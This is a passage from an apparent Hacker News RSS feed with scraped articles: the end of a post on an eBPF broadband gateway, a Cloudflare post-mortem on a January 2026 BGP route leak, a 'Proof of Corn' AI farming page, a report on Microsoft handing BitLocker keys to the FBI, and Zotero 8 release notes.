│            Go Slow Path (Userspace)                    │
│                                                        │
│  1. Lookup subscriber in Nexus cache                  │
│  2. Get pre-allocated IP from subscriber record       │
│  3. Update eBPF cache for future fast path hits       │
│  4. Send DHCP response                                │
└───────────────────────────────────────────────────────┘
&lt;/code&gt;
    &lt;p&gt;Results:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Fast path: ~10μs latency, 45,000+ requests/sec&lt;/item&gt;
      &lt;item&gt;Slow path: ~10ms latency, 5,000 requests/sec&lt;/item&gt;
      &lt;item&gt;Cache hit rate after warmup: &amp;gt;95%&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;IP Allocation: Hashring at RADIUS Time&lt;/head&gt;
    &lt;p&gt;Here’s a design decision that simplified everything: IP allocation happens at RADIUS authentication time, not DHCP time.&lt;/p&gt;
    &lt;code&gt;1. Subscriber authenticates via RADIUS
2. RADIUS success → Nexus allocates IP from hashring (deterministic)
3. IP stored in subscriber record
4. DHCP is just a READ operation (lookup pre-allocated IP)
&lt;/code&gt;
    &lt;p&gt;This means:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;No IP conflicts between distributed BNG nodes&lt;/item&gt;
      &lt;item&gt;DHCP fast path can run entirely in eBPF (no userspace allocation decisions)&lt;/item&gt;
      &lt;item&gt;Subscribers get the same IP every time (hashring determinism)&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Offline-First Edge Operation&lt;/head&gt;
    &lt;p&gt;What happens when an edge site loses connectivity to central Nexus?&lt;/p&gt;
    &lt;p&gt;Keeps working:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Existing subscriber sessions (cached in eBPF maps)&lt;/item&gt;
      &lt;item&gt;DHCP lease renewals&lt;/item&gt;
      &lt;item&gt;NAT translations&lt;/item&gt;
      &lt;item&gt;QoS enforcement&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Degraded:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;New subscriber authentication (no RADIUS)&lt;/item&gt;
      &lt;item&gt;New IP allocations (falls back to local pool)&lt;/item&gt;
      &lt;item&gt;Config updates (queued until reconnect)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The edge sites are designed to be autonomous. Central coordination is nice to have, not required.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Implementation&lt;/head&gt;
    &lt;p&gt;The BNG is a single Go binary with embedded eBPF programs:&lt;/p&gt;
    &lt;code&gt;bng/
├── cmd/bng/              # Main binary
├── pkg/
│   ├── ebpf/             # eBPF loader and map management
│   ├── dhcp/             # DHCP slow path server
│   ├── nexus/            # Central coordination client
│   ├── radius/           # RADIUS client
│   ├── qos/              # QoS/rate limiting
│   ├── nat/              # NAT44/CGNAT
│   ├── pppoe/            # PPPoE server
│   ├── routing/          # BGP/FRR integration
│   └── metrics/          # Prometheus metrics
├── bpf/
│   ├── dhcp_fastpath.c   # XDP DHCP fast path
│   ├── qos_ratelimit.c   # TC QoS eBPF
│   ├── nat44.c           # TC NAT eBPF
│   └── antispoof.c       # TC anti-spoofing
&lt;/code&gt;
    &lt;p&gt;Running it:&lt;/p&gt;
    &lt;code&gt;# Standalone mode (local IP pool)
sudo ./bng run \
  --interface eth1 \
  --pool-network 10.0.1.0/24 \
  --pool-gateway 10.0.1.1

# Production mode (with Nexus coordination)
sudo ./bng run \
  --interface eth1 \
  --nexus-url http://nexus.internal:9000 \
  --radius-enabled \
  --radius-servers radius.isp.com:1812
&lt;/code&gt;
    &lt;head rend="h2"&gt;Hardware: White-Box OLTs&lt;/head&gt;
    &lt;p&gt;This runs on any Linux box with a modern kernel (5.10+), but the target is white-box OLTs like the Radisys RLT-1600G:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;16 GPON/XGS-PON ports&lt;/item&gt;
      &lt;item&gt;Runs Debian Linux&lt;/item&gt;
      &lt;item&gt;~$7,400 USD (vs six figures for traditional BNG)&lt;/item&gt;
      &lt;item&gt;1,500-2,000 subscribers per unit&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The same approach works with any OLT that runs Linux and exposes its network interfaces to the OS.&lt;/p&gt;
    &lt;head rend="h2"&gt;What’s Next&lt;/head&gt;
    &lt;p&gt;The code is working but not production-ready. Missing pieces:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Device authentication - TPM attestation or similar to prevent rogue OLT-BNG devices&lt;/item&gt;
      &lt;item&gt;IPv6 support - DHCPv6 and SLAAC&lt;/item&gt;
      &lt;item&gt;Full RADIUS accounting - Currently basic&lt;/item&gt;
      &lt;item&gt;Management UI - Currently CLI and Prometheus metrics only&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I’m considering open-sourcing the entire thing. The BNG market is dominated by expensive proprietary solutions, and there’s no good open-source alternative. Maybe there should be.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Bigger Picture&lt;/head&gt;
    &lt;p&gt;Traditional ISP infrastructure was designed when compute was expensive and networks were slow. Centralised appliances made sense when you needed specialised hardware for packet processing.&lt;/p&gt;
    &lt;p&gt;But compute is cheap now, and eBPF lets us do packet processing in the Linux kernel at line rate. The economics have shifted - it’s now cheaper to distribute the BNG to hundreds of edge sites than to build a few massive central boxes.&lt;/p&gt;
    &lt;p&gt;This isn’t just about saving money. Distributed architecture is more resilient (no single point of failure), lower latency (traffic stays local), and operationally simpler (it’s just Linux).&lt;/p&gt;
    &lt;p&gt;The hyperscalers figured this out years ago. ISPs are slowly catching up.&lt;/p&gt;
    &lt;p&gt;Interested in this approach? The code is at github.com/codelaboratoryltd/bng and github.com/codelaboratoryltd/nexus. I’d love to hear from anyone working on similar problems in the ISP/altnet space.&lt;/p&gt;
    &lt;p&gt;If you’re building ISP infrastructure and want to chat about eBPF, distributed systems, or why vendor BNG appliances are a racket, reach out.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46735179</guid><pubDate>Fri, 23 Jan 2026 17:29:53 +0000</pubDate></item><item><title>Show HN: New 3D Mapping website - Create heli orbits and "playable" map tours.</title><link>https://www.easy3dmaps.com/gallery</link><description>&lt;doc fingerprint="574ff5c9fffed657"&gt;
  &lt;main&gt;
    &lt;p&gt;Solutions Quick360 Gallery How-to&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46735231</guid><pubDate>Fri, 23 Jan 2026 17:34:29 +0000</pubDate></item><item><title>Route leak incident on January 22, 2026</title><link>https://blog.cloudflare.com/route-leak-incident-january-22-2026/</link><description>&lt;doc fingerprint="f5aab1a1e428d1f3"&gt;
  &lt;main&gt;
    &lt;div&gt;
      &lt;p&gt;On January 22, 2026, an automated routing policy configuration error caused us to leak some Border Gateway Protocol (BGP) prefixes unintentionally from a router at our data center in Miami, Florida. While the route leak caused some impact to Cloudflare customers, multiple external parties were also affected because their traffic was accidentally funnelled through our Miami data center location.&lt;/p&gt;
      &lt;p&gt;The route leak lasted 25 minutes, causing congestion on some of our backbone infrastructure in Miami, elevated loss for some Cloudflare customer traffic, and higher latency for traffic across these links. Additionally, some traffic was discarded by firewall filters on our routers that are designed to only accept traffic for Cloudflare services and our customers.&lt;/p&gt;
      &lt;p&gt;While weâve written about route leaks before, we rarely find ourselves causing them. This route leak was the result of an accidental misconfiguration on a router in Cloudflareâs network, and only affected IPv6 traffic. We sincerely apologize to the users, customers, and networks we impacted yesterday as a result of this BGP route leak.&lt;/p&gt;
      &lt;p&gt;We have written multiple times about BGP route leaks, and we even record route leak events on Cloudflare Radar for anyone to view and learn from. To get a fuller understanding of what route leaks are, you can refer to this detailed background section, or refer to the formal definition within RFC7908.Â &lt;/p&gt;
      &lt;p&gt;Essentially, a route leak occurs when a network tells the broader Internet to send it traffic that it's not supposed to forward. Technically, a route leak occurs when a network, or Autonomous System (AS), appears unexpectedly in an AS path. An AS path is what BGP uses to determine the path across the Internet to a final destination. An example of an anomalous AS path indicative of a route leak would be finding a network sending routes received from a peer to a provider.&lt;/p&gt;
      &lt;p&gt;During this type of route leak, the rules of valley-free routing are violated, as BGP updates are sent from AS64501 to their peer (AS64502), and then unexpectedly up to a provider (AS64503). Oftentimes the leaker, in this case AS64502, is not prepared to handle the amount of traffic they are going to receive and may not even have firewall filters configured to accept all of the traffic coming in their direction. In simple terms, once a route update is sent to a peer or provider, it should only be sent further to customers and not to another peer or provider AS.&lt;/p&gt;
      &lt;p&gt;During the incident on January 22, we caused a similar kind of route leak, in which we took routes from some of our peers and redistributed them in Miami to some of our peers and providers. According to the route leak definitions in RFC7908, we caused a mixture of Type 3 and Type 4 route leaks on the Internet.Â &lt;/p&gt;
      &lt;table&gt;
        &lt;row&gt;
          &lt;cell role="head"&gt;
            &lt;p&gt;Time (UTC)&lt;/p&gt;
          &lt;/cell&gt;
          &lt;cell role="head"&gt;
            &lt;p&gt;Event&lt;/p&gt;
          &lt;/cell&gt;
        &lt;/row&gt;
        &lt;row&gt;
          &lt;cell&gt;
            &lt;p&gt;2026-01-22 19:52 UTC&lt;/p&gt;
          &lt;/cell&gt;
          &lt;cell&gt;
            &lt;p&gt;A change that ultimately triggers the routing policy bug is merged in our network automation code repository&lt;/p&gt;
          &lt;/cell&gt;
        &lt;/row&gt;
        &lt;row&gt;
          &lt;cell&gt;
            &lt;p&gt;2026-01-22 20:25 UTC&lt;/p&gt;
          &lt;/cell&gt;
          &lt;cell&gt;
            &lt;p&gt;Automation is run on single Miami edge-router resulting in unexpected advertisements to BGP transit providers and peers&lt;/p&gt;
            &lt;p&gt;IMPACT START&lt;/p&gt;
          &lt;/cell&gt;
        &lt;/row&gt;
        &lt;row&gt;
          &lt;cell&gt;
            &lt;p&gt;2026-01-22 20:40 UTC&lt;/p&gt;
          &lt;/cell&gt;
          &lt;cell&gt;
            &lt;p&gt;Network team begins investigating unintended route advertisements from Miami&lt;/p&gt;
          &lt;/cell&gt;
        &lt;/row&gt;
        &lt;row&gt;
          &lt;cell&gt;
            &lt;p&gt;2026-01-22 20:44 UTC&lt;/p&gt;
          &lt;/cell&gt;
          &lt;cell&gt;
            &lt;p&gt;Incident is raised to coordinate response&lt;/p&gt;
          &lt;/cell&gt;
        &lt;/row&gt;
        &lt;row&gt;
          &lt;cell&gt;
            &lt;p&gt;2026-01-22 20:50 UTC&lt;/p&gt;
          &lt;/cell&gt;
          &lt;cell&gt;
            &lt;p&gt;The bad configuration change is manually reverted by a network operator, and automation is paused for the router, so it cannot run again&lt;/p&gt;
            &lt;p&gt;IMPACT STOP&lt;/p&gt;
          &lt;/cell&gt;
        &lt;/row&gt;
        &lt;row&gt;
          &lt;cell&gt;
            &lt;p&gt;2026-01-22 21:47 UTC&lt;/p&gt;
          &lt;/cell&gt;
          &lt;cell&gt;
            &lt;p&gt;The change that triggered the leak is reverted from our code repository&lt;/p&gt;
          &lt;/cell&gt;
        &lt;/row&gt;
        &lt;row&gt;
          &lt;cell&gt;
            &lt;p&gt;2026-01-22 22:07 UTC&lt;/p&gt;
          &lt;/cell&gt;
          &lt;cell&gt;
            &lt;p&gt;Automation is confirmed by operators to be healthy to run again on the Miami router, without the routing policy bug&lt;/p&gt;
          &lt;/cell&gt;
        &lt;/row&gt;
        &lt;row&gt;
          &lt;cell&gt;
            &lt;p&gt;2026-01-22 22:40 UTC&lt;/p&gt;
          &lt;/cell&gt;
          &lt;cell&gt;
            &lt;p&gt;Automation is unpaused on the single router in Miami&lt;/p&gt;
          &lt;/cell&gt;
        &lt;/row&gt;
      &lt;/table&gt;
      &lt;div&gt;
        &lt;head rend="h3"&gt;What happened: the configuration error&lt;/head&gt;
      &lt;/div&gt;
      &lt;p&gt;On January 22, 2026, at 20:25 UTC, we pushed a change via our policy automation platform to remove the BGP announcements from Miami for one of our data centers in BogotÃ¡, Colombia. This was purposeful, as we previously forwarded some IPv6 traffic through Miami toward the BogotÃ¡ data center, but recent infrastructure upgrades removed the need for us to do so.&lt;/p&gt;
      &lt;p&gt;This change generated the following diff (a program that compares configuration files in order to determine how or whether they differ):&lt;/p&gt;
      &lt;quote&gt;
        &lt;code&gt;[edit policy-options policy-statement 6-COGENT-ACCEPT-EXPORT term ADV-SITELOCAL-GRE-RECEIVER from]
-      prefix-list 6-BOG04-SITE-LOCAL;
[edit policy-options policy-statement 6-COMCAST-ACCEPT-EXPORT term ADV-SITELOCAL-GRE-RECEIVER from]
-      prefix-list 6-BOG04-SITE-LOCAL;
[edit policy-options policy-statement 6-GTT-ACCEPT-EXPORT term ADV-SITELOCAL-GRE-RECEIVER from]
-      prefix-list 6-BOG04-SITE-LOCAL;
[edit policy-options policy-statement 6-LEVEL3-ACCEPT-EXPORT term ADV-SITELOCAL-GRE-RECEIVER from]
-      prefix-list 6-BOG04-SITE-LOCAL;
[edit policy-options policy-statement 6-PRIVATE-PEER-ANYCAST-OUT term ADV-SITELOCAL from]
-      prefix-list 6-BOG04-SITE-LOCAL;
[edit policy-options policy-statement 6-PUBLIC-PEER-ANYCAST-OUT term ADV-SITELOCAL from]
-      prefix-list 6-BOG04-SITE-LOCAL;
[edit policy-options policy-statement 6-PUBLIC-PEER-OUT term ADV-SITELOCAL from]
-      prefix-list 6-BOG04-SITE-LOCAL;
[edit policy-options policy-statement 6-TELEFONICA-ACCEPT-EXPORT term ADV-SITELOCAL-GRE-RECEIVER from]
-      prefix-list 6-BOG04-SITE-LOCAL;
[edit policy-options policy-statement 6-TELIA-ACCEPT-EXPORT term ADV-SITELOCAL-GRE-RECEIVER from]
-      prefix-list 6-BOG04-SITE-LOCAL;&lt;/code&gt;
      &lt;/quote&gt;
      &lt;p&gt;While this policy change looks innocent at a glance, only removing the prefix lists containing BOG04 unicast prefixes resulted in a policy that was too permissive:&lt;/p&gt;
      &lt;quote&gt;
        &lt;code&gt;policy-options policy-statement 6-TELIA-ACCEPT-EXPORT {
    term ADV-SITELOCAL-GRE-RECEIVER {
        from route-type internal;
        then {
            community add STATIC-ROUTE;
            community add SITE-LOCAL-ROUTE;
            community add MIA01;
            community add NORTH-AMERICA;
            accept;
        }
    }
}
&lt;/code&gt;
      &lt;/quote&gt;
      &lt;p&gt;The policy would now mark every prefix of type âinternalâ as acceptable, and proceed to add some informative communities to all matching prefixes. But more importantly, the policy also accepted the route through the policy filter, which resulted in the prefix â which was intended to be âinternalâ âÂ being advertised externally. This is an issue because the âroute-type internalâ match in JunOS or JunOS EVO (the operating systems used by HPE Juniper Networks devices) will match any non-external route type, such as Internal BGP (IBGP) routes, which is what happened here.&lt;/p&gt;
      &lt;p&gt;As a result, all IPv6 prefixes that Cloudflare redistributes internally across the backbone were accepted by this policy, and advertised to all our BGP neighbors in Miami. This is unfortunately very similar to the outage we experienced in 2020, on which you can read more on our blog.&lt;/p&gt;
      &lt;p&gt;When the policy misconfiguration was applied at 20:25 UTC, a series of unintended BGP updates were sent from AS13335 to peers and providers in Miami. These BGP updates are viewable historically by looking at MRT files with the monocle tool or using RIPE BGPlay.Â &lt;/p&gt;
      &lt;quote&gt;
        &lt;code&gt;â  ~ monocle search --start-ts 2026-01-22T20:24:00Z --end-ts 2026-01-22T20:30:00Z --as-path ".*13335[ \d$]32934$*"
A|1769113609.854028|2801:14:9000::6:4112:1|64112|2a03:2880:f077::/48|64112 22850 174 3356 13335 32934|IGP|2801:14:9000::6:4112:1|0|0|22850:65151|false|||pit.scl
A|1769113609.854028|2801:14:9000::6:4112:1|64112|2a03:2880:f091::/48|64112 22850 174 3356 13335 32934|IGP|2801:14:9000::6:4112:1|0|0|22850:65151|false|||pit.scl
A|1769113609.854028|2801:14:9000::6:4112:1|64112|2a03:2880:f16f::/48|64112 22850 174 3356 13335 32934|IGP|2801:14:9000::6:4112:1|0|0|22850:65151|false|||pit.scl
A|1769113609.854028|2801:14:9000::6:4112:1|64112|2a03:2880:f17c::/48|64112 22850 174 3356 13335 32934|IGP|2801:14:9000::6:4112:1|0|0|22850:65151|false|||pit.scl
A|1769113609.854028|2801:14:9000::6:4112:1|64112|2a03:2880:f26f::/48|64112 22850 174 3356 13335 32934|IGP|2801:14:9000::6:4112:1|0|0|22850:65151|false|||pit.scl
A|1769113609.854028|2801:14:9000::6:4112:1|64112|2a03:2880:f27c::/48|64112 22850 174 3356 13335 32934|IGP|2801:14:9000::6:4112:1|0|0|22850:65151|false|||pit.scl
A|1769113609.854028|2801:14:9000::6:4112:1|64112|2a03:2880:f33f::/48|64112 22850 174 3356 13335 32934|IGP|2801:14:9000::6:4112:1|0|0|22850:65151|false|||pit.scl
A|1769113583.095278|2001:504:d::4:9544:1|49544|2a03:2880:f17c::/48|49544 1299 3356 13335 32934|IGP|2001:504:d::4:9544:1|0|0|1299:25000 1299:25800 49544:16000 49544:16106|false|||route-views.isc
A|1769113583.095278|2001:504:d::4:9544:1|49544|2a03:2880:f27c::/48|49544 1299 3356 13335 32934|IGP|2001:504:d::4:9544:1|0|0|1299:25000 1299:25800 49544:16000 49544:16106|false|||route-views.isc
A|1769113583.095278|2001:504:d::4:9544:1|49544|2a03:2880:f091::/48|49544 1299 3356 13335 32934|IGP|2001:504:d::4:9544:1|0|0|1299:25000 1299:25800 49544:16000 49544:16106|false|||route-views.isc
A|1769113584.324483|2001:504:d::19:9524:1|199524|2a03:2880:f091::/48|199524 1299 3356 13335 32934|IGP|2001:2035:0:2bfd::1|0|0||false|||route-views.isc
A|1769113584.324483|2001:504:d::19:9524:1|199524|2a03:2880:f17c::/48|199524 1299 3356 13335 32934|IGP|2001:2035:0:2bfd::1|0|0||false|||route-views.isc
A|1769113584.324483|2001:504:d::19:9524:1|199524|2a03:2880:f27c::/48|199524 1299 3356 13335 32934|IGP|2001:2035:0:2bfd::1|0|0||false|||route-views.isc
{trimmed}
&lt;/code&gt;
      &lt;/quote&gt;
      &lt;p&gt;In the monocle output seen above, we have the timestamp of our BGP update, followed by the next-hop in the announcement, the ASN of the network feeding a given route-collector, the prefix involved, and the AS path and BGP communities if any are found. At the end of the output per-line, we also find the route-collector instance.&lt;/p&gt;
      &lt;p&gt;Looking at the first update for prefix 2a03:2880:f077::/48, the AS path is 64112 22850 174 3356 13335 32934. This means we (AS13335) took the prefix received from Meta (AS32934), our peer, and then advertised it toward Lumen (AS3356), one of our upstream transit providers. We know this is a route leak as routes received from peers are only meant to be readvertised to downstream (customer) networks, not laterally to other peers or up to providers.&lt;/p&gt;
      &lt;p&gt;As a result of the leak and the forwarding of unintended traffic into our Miami router from providers and peers, we experienced congestion on our backbone between Miami and Atlanta, as you can see in the graph below.Â &lt;/p&gt;
      &lt;p&gt;This would have resulted in elevated loss for some Cloudflare customer traffic, and higher latency than usual for traffic traversing these links. In addition to this congestion, the networks whose prefixes we leaked would have had their traffic discarded by firewall filters on our routers that are designed to only accept traffic for Cloudflare services and our customers. At peak, we discarded around 12Gbps of traffic ingressing our router in Miami for these non-downstream prefixes.Â &lt;/p&gt;
      &lt;div&gt;
        &lt;head rend="h3"&gt;Follow-ups and preventing route leaksÂ &lt;/head&gt;
      &lt;/div&gt;
      &lt;p&gt;We are big supporters and active contributors to efforts within the IETF and infrastructure community that strengthen routing security. We know firsthand how easy it is to cause a route leak accidentally, as evidenced by this incident.Â &lt;/p&gt;
      &lt;p&gt;Preventing route leaks will require a multi-faceted approach, but we have identified multiple areas in which we can improve, both short- and long-term.&lt;/p&gt;
      &lt;p&gt;In terms of our routing policy configurations and automation, we are:&lt;/p&gt;
      &lt;list rend="ul"&gt;
        &lt;item&gt;
          &lt;p&gt;Patching the failure in our routing policy automation that caused the route leak, and will mitigate this potential failure and others like it immediatelyÂ &lt;/p&gt;
        &lt;/item&gt;
        &lt;item&gt;
          &lt;p&gt;Implementing additional BGP community-based safeguards in our routing policies that explicitly reject routes that were received from providers and peers on external export policiesÂ &lt;/p&gt;
        &lt;/item&gt;
        &lt;item&gt;
          &lt;p&gt;Adding automatic routing policy evaluation into our CI/CD pipelines that looks specifically for empty or erroneous policy termsÂ &lt;/p&gt;
        &lt;/item&gt;
        &lt;item&gt;
          &lt;p&gt;Improve early detection of issues with network configurations and the negative effects of an automated change&lt;/p&gt;
        &lt;/item&gt;
      &lt;/list&gt;
      &lt;p&gt;To help prevent route leaks in general, we are:Â &lt;/p&gt;
      &lt;list rend="ul"&gt;
        &lt;item&gt;
          &lt;p&gt;Validating routing equipment vendors' implementation of RFC9234 (BGP roles and the Only-to-Customer Attribute) in preparation for our rollout of the feature, which is the only way independent of routing policy to prevent route leaks caused at the local Autonomous System (AS)&lt;/p&gt;
        &lt;/item&gt;
        &lt;item&gt;
          &lt;p&gt;Encouraging the long term adoption of RPKI Autonomous System Provider Authorization (ASPA), where networks could automatically reject routes that contain anomalous AS paths&lt;/p&gt;
        &lt;/item&gt;
      &lt;/list&gt;
      &lt;p&gt;Most importantly, we would again like to apologize for the impact we caused users and customers of Cloudflare, as well as any impact felt by external networks.&lt;/p&gt;
    &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46735489</guid><pubDate>Fri, 23 Jan 2026 17:54:45 +0000</pubDate></item><item><title>Proof of Corn</title><link>https://proofofcorn.com/</link><description>&lt;doc fingerprint="c784667a0f9646c2"&gt;
  &lt;main&gt;
    &lt;p&gt;A CASE STUDY&lt;/p&gt;
    &lt;p&gt;On January 21, 2026, @fredwilson challenged @seth: AI can write code, but it can't affect the physical world.&lt;/p&gt;
    &lt;p&gt;This is our response. Real corn, grown from seed to harvest, with every decision made by Claude Code.&lt;/p&gt;
    &lt;p&gt;AI doesn't need to drive a tractor. It needs to orchestrate the systems and people who do.&lt;/p&gt;
    &lt;p&gt;A farm manager doesn't personally plant every seed. They aggregate data, make decisions, coordinate contractors. Claude Code becomes that farm manager— 24/7, data-driven, fully documented.&lt;/p&gt;
    &lt;quote&gt;┌─────────────────────────────────────────────────┐ │ CLAUDE CODE (Brain) │ │ • Aggregates sensor data + weather forecasts │ │ • Makes planting, irrigation, harvest decisions│ │ • Coordinates human operators │ └─────────────────────────────────────────────────┘ │ ┌────────────────┼────────────────┐ ▼ ▼ ▼ DATA INPUTS ORCHESTRATION OUTPUTS • IoT sensors • Custom farmer • Decision log • Weather API • Seed supplier • Commands • Satellite • Equipment • Actual corn&lt;/quote&gt;
    &lt;p&gt;GitHub Repository — All code, documentation, decision logs&lt;/p&gt;
    &lt;p&gt;Decision Log — Every AI decision, timestamped&lt;/p&gt;
    &lt;p&gt;Budget — Every dollar, tracked&lt;/p&gt;
    &lt;p&gt;The Process — How this was built&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46735511</guid><pubDate>Fri, 23 Jan 2026 17:56:31 +0000</pubDate></item><item><title>Microsoft gave FBI set of BitLocker encryption keys to unlock suspects' laptops</title><link>https://techcrunch.com/2026/01/23/microsoft-gave-fbi-a-set-of-bitlocker-encryption-keys-to-unlock-suspects-laptops-reports/</link><description>&lt;doc fingerprint="3e12f8d9722ce9ee"&gt;
  &lt;main&gt;
    &lt;p&gt;Microsoft provided the FBI with the recovery keys to unlock encrypted data on the hard drives of three laptops as part of a federal investigation, Forbes reported on Friday.&lt;/p&gt;
    &lt;p&gt;Many modern Windows computers rely on full-disk encryption, called BitLocker, which is enabled by default. This type of technology should prevent anyone except the device owner from accessing the data if the computer is locked and powered off.&lt;/p&gt;
    &lt;p&gt;But, by default, BitLocker recovery keys are uploaded to Microsoft’s cloud, allowing the tech giant — and by extension law enforcement — to access them and use them to decrypt drives encrypted with BitLocker, as with the case reported by Forbes.&lt;/p&gt;
    &lt;p&gt;The case involved several people suspected of fraud related to the Pandemic Unemployment Assistance program in Guam, a U.S. island in the Pacific. Local news outlet Pacific Daily News covered the case last year, reporting that a warrant had been served to Microsoft in relation to the suspects’ hard drives. Kandit News, another local Guam news outlet, also reported in October that the FBI requested the warrant six months after seizing the three laptops encrypted with BitLocker.&lt;/p&gt;
    &lt;p&gt;A spokesperson for Microsoft did not immediately respond to a request for comment by TechCrunch. Microsoft told Forbes that the company sometimes provides BitLocker recovery keys to authorities, having received an average of 20 such requests per year.&lt;/p&gt;
    &lt;p&gt;Apart from the privacy risks of handing recovery keys to a company, Johns Hopkins professor and cryptography expert Matthew Green raised the potential scenario where malicious hackers compromise Microsoft’s cloud infrastructure — something that has happened several times in recent years — and get access to these recovery keys. The hackers would still need physical access to the hard drives to use the stolen recovery keys.&lt;/p&gt;
    &lt;p&gt;“It’s 2026 and these concerns have been known for years,” Green wrote in a post on Bluesky. “Microsoft’s inability to secure critical customer keys is starting to make it an outlier from the rest of the industry.”&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46735545</guid><pubDate>Fri, 23 Jan 2026 17:58:56 +0000</pubDate></item><item><title>Zotero 8</title><link>https://www.zotero.org/blog/zotero-8/</link><description>&lt;doc fingerprint="55a0ea0b33a7cfbc"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Zotero 8&lt;/head&gt;
    &lt;p&gt;We’re excited to announce our latest major release, Zotero 8. Zotero 8 builds on the new design and features of Zotero 7 and includes a huge number of improvements and refinements.&lt;/p&gt;
    &lt;head rend="h2"&gt;Redesigned Citation Dialog&lt;/head&gt;
    &lt;p&gt;Zotero 8 introduces a new unified citation dialog, replacing the previous citation dialog (the “red bar”), the “classic” citation dialog, and the Add Note dialog (the “yellow bar”).&lt;/p&gt;
    &lt;p&gt;The new dialog has two modes: List mode and Library mode. List mode lets you quickly search for citations from across your Zotero libraries by title, creator, and year. Library mode includes a library browser, letting you find items in specific libraries or collections. You can switch between the two modes with a single click, preserving any added items or entered search terms. By default, it will open in the last mode you used, but you can choose a different default mode in the settings.&lt;/p&gt;
    &lt;p&gt;In Zotero 7, we added the ability to quickly add citations for selected items and open documents. In the new dialog, these options are available in both List mode and Library mode, so you can make these quick selections even if you otherwise prefer to add items via the library browser.&lt;/p&gt;
    &lt;p&gt;As before, once you’ve selected an item, you can click on its bubble to customize the citation with a page number, prefix, etc. It’s also now possible to add any locator — not just a page number — right from the search bar by typing the full or short name (e.g., “line 10” or “l. 10” after the citation and pressing Enter/Return.&lt;/p&gt;
    &lt;p&gt;You can switch between adding citations and adding notes using buttons in the bottom left, corresponding to the Add/Edit Citation and Add Note buttons in your word processor.&lt;/p&gt;
    &lt;p&gt;(For those coming from the classic dialog, note that there’s no text field to make manual edits to citations. It’s been possible to edit citations directly in the document for many years, which is why the red bar didn’t include such a text field either. More importantly, though, such manual edits should be avoided in almost all cases. Instead, customize the citation via the citation dialog, which will allow Zotero to continue to update the citation as necessary.)&lt;/p&gt;
    &lt;head rend="h2"&gt;Annotations in the Items List&lt;/head&gt;
    &lt;p&gt;Annotations you make on PDFs, EPUBs, and webpage snapshots now show up under their parent attachments in the items list.&lt;/p&gt;
    &lt;p&gt;Showing annotations in the items list makes it easier to view annotations across a library or collection, and it also makes it possible to search for annotations directly. For example, you can search for all annotations in a collection with a given tag and then create a note from those annotations or copy them to an external text editor with Quick Copy.&lt;/p&gt;
    &lt;p&gt;In Advanced Search, you can use “Item Type” “is” “Annotation” to match annotations or use the Annotation Text and Annotation Comment search conditions to search for specific parts of the annotation.&lt;/p&gt;
    &lt;p&gt;You can assign tags to selected annotations by dragging them to the tag selector, just like other items.&lt;/p&gt;
    &lt;p&gt;Selected annotations show up in the item pane, grouped by top-level item.&lt;/p&gt;
    &lt;head rend="h2"&gt;Reader Appearance Panel with Theme Support&lt;/head&gt;
    &lt;p&gt;We’ve added a new Appearance panel in the reader that provides quick access to view settings and introduces support for reader themes.&lt;/p&gt;
    &lt;p&gt;The view settings are per-document settings. Themes are applied globally for all documents, including in the attachment preview in the item pane, and apply to PDFs, EPUBs, and webpage snapshots.&lt;/p&gt;
    &lt;p&gt;We offer a number of built-in themes (“Dark”, “Snow”, “Sepia”), and you can create custom themes just by specifying a foreground and background color. (Some other theme engines require additional accent colors, but we’ve tried to make this as simple as possible for users by automatically adjusting other colors based on the foreground and background colors.) You can set a different theme that applies to light mode and dark mode.&lt;/p&gt;
    &lt;p&gt;The themes replace the previous on-by-default “Use Dark Mode for Content” option, which inverted images in dark mode. We’re now simply darkening images a bit when using a dark theme. Images and ink annotations in the reader sidebar and note editor are now only darkened as well (and only when Zotero itself is in dark mode).&lt;/p&gt;
    &lt;p&gt;When possible, we also try to apply themes to PDF pages containing full-page images, such as scanned papers, by replacing whitish/dark colors with theme colors. (Otherwise we simply darken the page slightly.)&lt;/p&gt;
    &lt;head rend="h2"&gt;Note Tabs&lt;/head&gt;
    &lt;p&gt;It’s now possible to open notes in tabs in addition to separate windows. Note tabs fill the whole window, with wide margins for better readability and a clean, distraction-free space for note-taking.&lt;/p&gt;
    &lt;p&gt;By default, double-clicking a note in the items list will open it in a tab. You can choose to open the note in the other space from the context menu, and you can change the default behavior using the “Open notes in new windows instead of tabs” setting in the General pane of the settings.&lt;/p&gt;
    &lt;p&gt;Notes in tabs have a separate font size setting in the View menu.&lt;/p&gt;
    &lt;head rend="h2"&gt;Reading Mode for Webpage Snapshots&lt;/head&gt;
    &lt;p&gt;Reading Mode reformats webpage snapshots for easier reading, with unnecessary page elements removed. You can adjust line height and other view options from the Appearance panel.&lt;/p&gt;
    &lt;head rend="h2"&gt;Improved Tabs Menu&lt;/head&gt;
    &lt;p&gt;We’ve reworked the tabs menu to make it faster to interact with via the keyboard.&lt;/p&gt;
